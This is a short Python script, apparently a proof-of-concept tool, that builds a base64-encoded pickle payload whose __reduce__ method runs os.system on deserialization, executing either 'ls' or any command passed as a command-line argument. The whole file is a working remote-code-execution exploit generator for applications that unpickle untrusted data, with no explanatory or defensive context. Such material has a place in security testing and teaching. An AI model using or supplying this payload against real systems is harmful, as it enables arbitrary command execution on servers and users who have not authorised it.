import sys
import pickle
from base64 import b64encode, b64decode


class Exploit_ARGV(object):
    def __reduce__(self):
        import os
        return(os.system,(sys.argv[1].encode(), ))


class Exploit(object):
    def __reduce__(self):
        import os
        return(os.system,(b"ls", ))


if len(sys.argv) > 1:
    USER_MAL = Exploit_ARGV()
else:
    USER_MAL = Exploit()

user_mal = b64encode(pickle.dumps(USER_MAL))
print(user_mal.decode())
